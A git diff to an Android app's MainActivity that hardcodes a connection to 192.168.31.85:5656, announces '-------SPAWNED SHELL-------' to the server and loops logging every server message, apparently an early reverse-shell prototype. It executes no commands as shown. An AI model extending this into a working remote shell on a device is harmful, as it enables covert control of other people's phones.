@@ -32,8 +32,11 @@ public class MainActivity extends AppCompatActivity {
             in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
         }
 
-        public String sendMessage(String msg) throws IOException {
-            out.println(msg);
+        public void sendFromClient(String fromClient) throws IOException {
+            out.println(fromClient);
+        }
+
+        public String receiveFromServer() throws IOException {
             return in.readLine();
         }
 
@@ -59,10 +62,13 @@ public class MainActivity extends AppCompatActivity {
                     @Override
                     public void run() {
                         try {
-                            serverConnect.startConnection("IP", 5656);
+                            serverConnect.startConnection("192.168.31.85", 5656);
                             Log.i("Connection", "Connection started");
-                            String response = serverConnect.sendMessage("hello");
-                            Log.i("Server Response", response);
+                            serverConnect.sendFromClient("-------SPAWNED SHELL-------");
+                            while (true) {
+                                String S2C = serverConnect.receiveFromServer();
+                                Log.i("Received from the server", S2C);
+                            }
                         } catch (Exception e) {
                             e.printStackTrace();
                         }
